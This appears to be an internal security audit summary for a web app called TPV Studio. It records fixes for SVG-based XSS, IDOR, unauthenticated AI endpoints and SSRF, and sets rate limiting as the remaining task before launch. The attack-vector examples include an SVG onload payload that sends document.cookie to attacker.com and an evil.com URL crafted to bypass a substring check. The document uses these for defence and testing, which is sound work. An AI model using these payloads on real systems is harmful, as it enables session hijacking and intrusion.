# TPV Studio Security Audit Summary

**Date:** November 24, 2025
**Status:** ⚠️ **CONDITIONAL GO - Critical Fixes Required**
**Auditor:** Comprehensive automated security review

---

## Executive Summary

TPV Studio underwent a complete security audit focusing on authentication, authorization, XSS prevention, and cost protection. Three **CRITICAL** vulnerabilities were identified and **TWO have been fixed**. One CRITICAL issue (rate limiting) requires infrastructure setup before customer launch.

### Current Status

| Issue | Severity | Status | Risk if Unaddressed |
|-------|----------|--------|-------------------|
| XSS via SVG Injection | 🔴 CRITICAL | ✅ **FIXED** | Account takeover, session hijacking |
| Authorization Bypass (IDOR) | 🔴 CRITICAL | ✅ **FIXED** | Users access other users' data |
| No Rate Limiting | 🔴 CRITICAL | ⏳ **SETUP REQUIRED** | Runaway AI costs ($1000s/day) |
| Unauthenticated AI Access | 🟠 HIGH | ✅ **FIXED** | Anonymous cost attacks |
| URL Validation (SSRF) | 🟠 HIGH | ✅ **FIXED** | Internal network access |

---

## 🔴 CRITICAL: Fixes Implemented

### 1. XSS Prevention via SVG Sanitization ✅

**Problem:** User-uploaded and AI-generated SVGs rendered without sanitization, allowing JavaScript execution.

**Attack Vector:**
```xml
<svg onload="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

**Fix Applied:**
- ✅ Installed DOMPurify library
- ✅ Created comprehensive `sanitizeSVG()` utility
- ✅ Applied sanitization in `SVGPreview.jsx` before rendering
- ✅ Added server-side validation in `process-uploaded-svg.js`
- ✅ Sanitize before recoloring in `svgRecolor.js`
- ✅ Remove dangerous elements: `<script>`, `<foreignObject>`, event handlers
- ✅ Log suspicious content removal for monitoring

**Files Modified:**
- `src/utils/sanitizeSVG.js` (NEW)
- `src/components/SVGPreview.jsx`
- `api/process-uploaded-svg.js`
- `src/utils/svgRecolor.js`

**Testing:**
```javascript
// Test malicious SVG rejection
const malicious = '<svg><script>alert("XSS")</script></svg>';
const result = sanitizeSVG(malicious);
// Result: <svg></svg> (script removed)
```

---

### 2. Authorization Bypass (IDOR) Prevention ✅

**Problem:** No explicit ownership checks - users could access/modify/delete other users' designs and projects by guessing IDs.

**Attack Vector:**
```
GET /api/designs/by-id?id=<victim's_design_id>
// Returns victim's design without ownership check
```

**Fix Applied:**
- ✅ Created `authorization.js` utility with `ensureOwnership()` helpers
- ✅ Added explicit `.eq('user_id', user.id)` to ALL data queries
- ✅ Implemented defense-in-depth (double-check ownership)
- ✅ Return 403 Forbidden for unauthorized access
- ✅ Log ownership violations for security monitoring

**Files Modified:**
- `api/_utils/authorization.js` (NEW)
- `api/designs/by-id.js` (GET/PUT/DELETE protected)
- `api/designs/save.js` (UPDATE protected)
- `api/projects/by-id.js` (PUT/DELETE protected)

**Testing:**
```bash
# Try to access another user's design
curl -H "Authorization: Bearer USER_A_TOKEN" \
  "https://app.com/api/designs/by-id?id=USER_B_DESIGN_ID"
# Expected: 404 Not Found (or 403 Forbidden)
```

---

### 3. Unauthenticated AI Access Blocked ✅

**Problem:** Expensive AI endpoints (Recraft, Claude, vectorization) allowed anonymous access, enabling cost attacks.

**Cost Analysis:**
- Recraft generation: $0.10/call
- Anonymous attacker: 100 calls/min = $600/hour = $14,400/day

**Fix Applied:**
- ✅ Require authentication for `api/recraft-generate.js`
- ✅ Require authentication for `api/recraft-vectorize.js`
- ✅ Require authentication for `api/vectorise.js`
- ✅ Require authentication for `api/generate-design-name.js`
- ✅ Require authentication for `api/export-pdf.js`
- ✅ Return 401 Unauthorized for unauthenticated requests

**Files Modified:**
- All expensive endpoint files (5 total)

---

### 4. URL Validation (SSRF) Fixed ✅

**Problem:** Weak URL validation using substring checks, allowing SSRF attacks.

**Attack Vector:**
```
POST /api/process-uploaded-svg
{ "svg_url": "https://evil.com/steal?next=supabase.co/storage/fake.svg" }
// Bypasses check: url.includes('supabase.co/storage')
```

**Fix Applied:**
- ✅ Replace substring checks with proper `URL()` parsing
- ✅ Validate origin matches Supabase exactly
- ✅ Verify path contains `/storage/v1/object/`
- ✅ Reject file:// and private IP ranges

**File Modified:**
- `api/process-uploaded-svg.js`

---

## ⚠️ CRITICAL: Rate Limiting Required

### Problem: No Rate Limiting on Expensive Operations

**Current Risk:**
- Authenticated users can spam generations without limit
- Single malicious user could cost $1,000+/day
- No protection against legitimate user making mistakes (infinite retry loops)

**Solution:** Implement rate limiting BEFORE customer launch.

**Documentation:** See `SECURITY-RATE-LIMITING.md` for:
- Option 1: Upstash Redis (recommended, free tier)
- Option 2: Vercel KV (if on Pro/Enterprise)
- Option 3: Database-based (free, slower)

**Recommended Limits:**
- 10 generations per user per hour
- 50 design names per hour
- 20 PDF exports per hour

**Maximum cost with limits:** $2.55/user/hour

**Estimated Implementation Time:** 2-4 hours

---

## 🟢 Additional Improvements Recommended

### Medium Priority (Before Launch)

1. **Content Security Policy (CSP)**
   - Current CSP allows `'unsafe-inline'` scripts
   - Recommendation: Remove inline script support, use nonces
   - File: `vercel.json`

2. **Email Domain Enforcement (Server-Side)**
   - Current: Client-side only check for `@rosehill.group`
   - Recommendation: Add Supabase Auth Hook or server-side check
   - Prevents non-company users from accessing via API directly

3. **Storage Quotas**
   - No limits on files uploaded per user
   - Recommendation: Track usage, enforce 500MB/user quota
   - Prevents storage cost attacks

4. **Webhook Idempotency**
   - Minor race condition in webhook processing
   - Recommendation: Add UNIQUE constraint on `studio_webhooks` table

### Low Priority (Post-Launch)

1. **Optimistic Locking**
   - Add `version` field to designs for concurrent edit detection

2. **Pagination Limits**
   - Cap list endpoints at 100 items max

3. **TypeScript Migration**
   - Add type safety to prevent runtime errors

4. **Structured Logging**
   - Use winston or pino for better production debugging

---

## Testing Checklist

Before customer launch, manually test:

### XSS Prevention
- [ ] Upload SVG with `<script>` tag → Should be removed
- [ ] Upload SVG with `onload` handler → Should be removed
- [ ] Generate design and inspect rendered SVG → No dangerous elements

### Authorization
- [ ] Try to access another user's design → 404/403 error
- [ ] Try to update another user's design → 403 error
- [ ] Try to delete another user's project → 403 error

### Authentication
- [ ] Call generation endpoint without auth → 401 error
- [ ] Call vectorize endpoint without auth → 401 error
- [ ] Call PDF export without auth → 401 error

### Rate Limiting (Once Implemented)
- [ ] Make 11 generations in 1 hour → 11th returns 429
- [ ] Wait for reset → Can generate again
- [ ] Frontend shows friendly error message

---

## Deployment Instructions

### 1. Deploy Current Fixes

Already deployed:
```bash
# Commits pushed:
# - bdc6a88c: SVG sanitization
# - 7bb90e12: Authorization checks
# - 878a9088: Authentication requirements
```

### 2. Set Up Rate Limiting

**MUST complete before customer launch.**

Follow instructions in `SECURITY-RATE-LIMITING.md`:

**Quick Start (Upstash - 30 minutes):**
```bash
# 1. Create Upstash account at upstash.com
# 2. Create Redis database, copy credentials
# 3. Add to Vercel env vars:
vercel env add UPSTASH_REDIS_REST_URL
vercel env add UPSTASH_REDIS_REST_TOKEN

# 4. Install dependencies:
npm install @upstash/ratelimit @upstash/redis

# 5. Create middleware.js (see SECURITY-RATE-LIMITING.md)

# 6. Deploy:
git add middleware.js package.json
git commit -m "Add rate limiting"
git push
```

### 3. Monitor First Week

- Watch Vercel function invocations
- Monitor Supabase storage usage
- Check for rate limit triggers (legitimate vs attacks)
- Review error logs for unauthorized access attempts

---

## Incident Response

### If Cost Attack Detected

1. **Immediate:** Disable expensive endpoints
   ```javascript
   // Add to api/recraft-generate.js
   return res.status(503).json({ error: 'Temporarily unavailable' });
   ```

2. **Identify attacker:** Check logs for high-frequency user
   ```sql
   SELECT user_id, COUNT(*) FROM studio_jobs
   WHERE created_at > NOW() - INTERVAL '1 hour'
   GROUP BY user_id ORDER BY COUNT(*) DESC;
   ```

3. **Block user:** Disable account in Supabase auth
4. **Implement rate limiting:** Follow SECURITY-RATE-LIMITING.md
5. **Re-enable:** Once rate limits are active

### If XSS Attack Detected

1. **Immediate:** Check SVG sanitization is active
2. **Review logs:** Look for sanitization warnings
3. **Inspect affected designs:** Find and remove malicious content
4. **Notify affected users:** If session tokens potentially compromised

### If IDOR Attack Detected

1. **Review logs:** Look for ownership violation warnings
2. **Identify affected data:** What did attacker access?
3. **Notify affected users:** Data breach disclosure if required
4. **Verify all endpoints:** Have ownership checks

---

## Security Contact

For security issues:
- Email: daniel.price@rosehill.group
- Review logs: Vercel dashboard → Functions → Logs
- Database access: Supabase dashboard

**Report template:**
```
Subject: [SECURITY] <Brief description>

When: <Timestamp>
What: <What happened>
Where: <Which endpoint/file>
Evidence: <Logs, screenshots>
Impact: <Users affected, data exposed>
```

---

## Go-Live Decision

### ✅ Can Launch After:
1. Rate limiting implemented (2-4 hours)
2. All tests passing (1 hour)
3. Team briefed on monitoring (30 min)

### Estimated Total Time to Launch-Ready: 4-6 hours

### Risk Assessment Without Rate Limiting:
- **Financial Risk:** HIGH - Potential $1,000+/day in unexpected costs
- **Security Risk:** MEDIUM - Auth prevents anonymous attacks, but authenticated users can abuse
- **Reputation Risk:** LOW - No data breach risk, just cost risk

**Recommendation:** Complete rate limiting before customer launch. All other critical issues are resolved.
